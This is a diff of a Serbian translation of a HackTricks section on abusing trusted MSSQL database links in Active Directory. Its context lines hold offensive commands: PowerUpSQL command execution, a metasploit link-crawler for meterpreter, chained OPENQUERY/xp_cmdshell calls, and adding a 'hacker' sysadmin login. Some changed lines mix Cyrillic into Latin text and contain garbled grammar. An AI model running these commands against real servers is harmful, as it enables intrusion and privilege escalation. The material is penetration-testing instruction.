@@ -140,26 +140,26 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Možda će biti moguće **izvršiti komande** unutar MSSQL hosta
+Možda će biti moguće da se **izvrše komande** unutar MSSQL hosta
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in the page mentioned in the **following section how to do this manually.**
+Check in the page mentioned in the **следећем одељку како то урадити ручно.**
 
-### MSSQL Osnovne Hacking Tehnike
+### MSSQL Основне Хакерске Трик
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## MSSQL Pouzdane Povezane Baze
+## MSSQL Поверљиве Везе
 
-Ako je MSSQL instanca pouzdana (povezivanje baze podataka) od strane druge MSSQL instance. Ako korisnik ima privilegije nad pouzdanom bazom podataka, moći će da **iskoristi odnos poverenja da izvrši upite i u drugoj instanci**. Ove veze poverenja mogu se povezivati i u nekom trenutku korisnik može pronaći neku pogrešno konfigurisanu bazu podataka gde može izvršavati komande.
+Ако је MSSQL инстанца поверљива (веза базе података) од стране друге MSSQL инстанце. Ако корисник има привилегије над поверљивом базом података, он ће моћи да **искористи поверење да изврши упите и у другој инстанци**. Ове везе могу бити повезане и у неком тренутку корисник може бити у могућности да пронађе неку неправилно конфигурисану базу података где може извршавати команде.
 
-**Povezivanja između baza funkcionišu čak i preko šuma poverenja.**
+**Везе између база података функционишу чак и преко поверења у шумама.**
 
-### Zloupotreba Powershell-a
+### Злоупотреба Powershell
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -199,11 +199,11 @@ Možete lako proveriti pouzdane linkove koristeći metasploit.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Napomena da će metasploit pokušati da zloupotrebi samo `openquery()` funkciju u MSSQL (tako da, ako ne možete da izvršite komandu sa `openquery()`, moraćete da pokušate `EXECUTE` metodu **ručno** da izvršite komande, više informacija u nastavku.)
+Obratite pažnju da će metasploit pokušati da zloupotrebi samo `openquery()` funkciju u MSSQL (tako da, ako ne možete da izvršite komandu sa `openquery()`, moraćete da pokušate `EXECUTE` metodu **ručno** da izvršite komande, više informacija u nastavku.)
 
 ### Ručno - Openquery()
 
-Sa **Linux-a** možete dobiti MSSQL konzolu sa **sqsh** i **mssqlclient.py.**
+Sa **Linux-a** možete dobiti MSSQL konzolnu ljusku sa **sqsh** i **mssqlclient.py.**
 
 Sa **Windows-a** takođe možete pronaći linkove i izvršiti komande ručno koristeći **MSSQL klijent kao** [**HeidiSQL**](https://www.heidisql.com)
 
@@ -238,9 +238,9 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Ako ne možete da izvršite akcije poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa metodom `EXECUTE`.
+Ako ne možete izvršiti akcije poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa metodom `EXECUTE`.
 
-### Manual - EXECUTE
+### Ručno - EXECUTE
 
 Takođe možete zloupotrebiti poverljive veze koristeći `EXECUTE`:
 ```bash
@@ -254,7 +254,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 Strategija koju su mnogi autori smislili je da primoraju SYSTEM servis da se autentifikuje na zlonamerni ili man-in-the-middle servis koji napadač kreira. Ovaj zlonamerni servis tada može da imitira SYSTEM servis dok pokušava da se autentifikuje.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju ovih različitih tehnika koje se mogu izvršiti putem Beacon-ove komande `execute-assembly`.
+[SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju ovih različitih tehnika koje se mogu izvršiti putem Beacon-ove `execute-assembly` komande.
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
@@ -266,7 +266,7 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Podrška HackTricks</summary>
+<summary>Podržite HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
